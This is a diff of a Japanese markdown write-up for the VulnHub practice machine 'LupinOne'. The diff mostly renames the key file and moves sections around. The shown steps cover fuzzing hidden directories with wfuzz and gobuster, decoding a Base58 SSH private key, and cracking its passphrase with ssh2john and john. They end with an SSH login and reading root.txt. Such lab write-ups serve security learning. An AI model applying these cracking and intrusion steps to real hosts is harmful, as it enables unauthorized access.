@@ -1,30 +1,26 @@
 ## LupinOne
+- 使っている言語の設定を確認する
+  - `echo $LANG`
+  - 次の表示が出たらいい`ja_JP.UTF-8`
 
 ### ポートスキャンまで同じ
 - 22,80
-
-### 画像を調べる
-- ステガノグラフィを調べる
 
 ### robots.txtを見る
 - `curl http://$IP/robots.txt` 
 - ヒントは`/~myfiles`で、ディレクトリの初めに~がついていることがわかる
 - ~myfilesを見ても`404 error`になる  
 
-### SecListsの辞書を使うので、Parrotのどこにあるか調べる
-- SecLists-masterがどこにあるかを調べる
-  - `find / -iname "*master" 2>/dev/null`
-  - ここに出てきたパスの場所を次のコマンドで使う
+
 
 ### 隠しディレクトリを探す
 - ディレクトリの初めにチルダ(~)がついていると仮定して探す 
-- `wfuzz -c -z file,/home/user/vulnhub/SecLists-master/Discovery/Web-Content/raft-large-directories.txt  "http://$IP/~FUZZ/"`
+- `wfuzz -c -w /usr/share/wordlists/dirb/common.txt --hc 404  "http://$IP/~FUZZ/"`
   - `-c`でカラー表示
   - `-z file,`は辞書の指定だが、わかりにくいので`-w`でいい
   - 初めは`--h?`をつけずに実行して関係なさそうなのを探す。ここでは404のステータスコードを返しているので`--hc 404`をつける
-- 見つかったファイルは`secret` `myfiles`、時間が長いので2つ見つけたら止める
-- `wfuzz -c -z file,/home/user/vulnhub/SecLists-master/Discovery/Web-Content/raft-large-directories.txt  --hc 404 "http://$IP/~FUZZ/"`
-  - helpを見て`--h?`を他に行や単語数、文字数でもやってみる 
+  - 見つかったファイルは`secret`、時間が長いので2つ見つけたら止める
+
 
 - (別解)
 - `gobuster fuzz -u http://$IP/~FUZZ -w /usr/share/wordlists/dirb/common.txt -b 404`
@@ -42,13 +38,7 @@
 - `wc fasttrack.txt`数が少ない
 
 
-### さらに隠しファイルを探すが、その前に辞書を整理する
-- wfuzzの特性上`#`も200(成功)に反応するので、`#`を辞書から削除する
-  - `#`はフラグメント識別子と言って、サイト内の特定の場所に移動できる  
-- `grep -v '^\s*#' /usr/share/wordlists/rockyou.txt > ./custom_rockyou.txt`
-  - `-v`は`'^\s*#'`以外の正規表現を抜き出す
-  -  `^#`は単語の最初が#であるのを抽出
-  - `\s`はスペースのことで`\s*`はスペースが０以上あるものを抽出 
+
 
 ### 隠しファイルを探す
 - 本来は辞書のファイルを使うが、ここで欲しいのは秘密鍵のファイルで拡張子が`.txt`なので、上で作った、パスワードファイルのrockyou.txtを使う
@@ -75,22 +65,22 @@
 - 一番左のsearchに`from base`と入力する。
 - 青色の背景になるのでFrom base32~From base92まで順に上からドロップ&ドラッグでRecipeに置いておくとOutputに文字化けしないのを試していく。文字化けしたらゴミ箱があるのでゴミ箱を押して消して次のOperationに進んでいく
 - Base58でデコード(復号)する。そして、コピーする
-- `cat > key`で貼り付ける。注意するのは、ペーストしたら改行してから、`ctrl + c`で抜ける
+- `cat > id_rsa_icex64`で貼り付ける。注意するのは、ペーストしたら改行してから、`ctrl + c`で抜ける
 ### 秘密鍵のPermissionを変更する
-- `chmod 400 key`
+- `chmod 400 id_rsa_icex64`
   - rootにreadだけをつければいいので、400でいい 
-  - `chmod 777 key`にするとsshが繋がらない。これは秘密鍵は本来、所有者しか使うことができなので当然なので、それに合わせている
+  - `chmod 777 id_rsa_icex64`にするとsshが繋がらない。これは秘密鍵は本来、所有者しか使うことができなので当然なので、それに合わせている
 
 ### パスフレーズの解析
 - (1) コマンドを使う。とても簡単これだけでもいい
-  - `ssh2john key > pass.txt` 
+  - `ssh2john id_rsa_icex64 > pass.txt` 
 - 暗号解析
   - `sudo john pass.txt -wordlist=/usr/share/wordlists/fasttrack.txt`
   - パスフレーズが取得できる
   - `P@55w0rd!` 
 
 ### sshでアクセス
-- `ssh -i key icex64@$IP`
+- `ssh -i id_rsa_icex64 icex64@$IP`
   - パスフレーズの入力 
 
 ### システム内の調査
@@ -139,6 +129,17 @@
 - `cd /root`
 - `cat root.txt`
 
+## 追記
 
+### SecListsの辞書を使うので、Parrotのどこにあるか調べる
+- SecLists-masterがどこにあるかを調べる
+  - `find / -iname "*master" 2>/dev/null`
+  - ここに出てきたパスの場所を次のコマンドで使う
 
-
+### さらに隠しファイルを探すが、その前に辞書を整理する
+- wfuzzの特性上`#`も200(成功)に反応するので、`#`を辞書から削除する
+  - `#`はフラグメント識別子と言って、サイト内の特定の場所に移動できる  
+- `grep -v '^\s*#' /usr/share/wordlists/rockyou.txt > ./custom_rockyou.txt`
+  - `-v`は`'^\s*#'`以外の正規表現を抜き出す
+  -  `^#`は単語の最初が#であるのを抽出
+  - `\s`はスペースのことで`\s*`はスペースが０以上あるものを抽出 
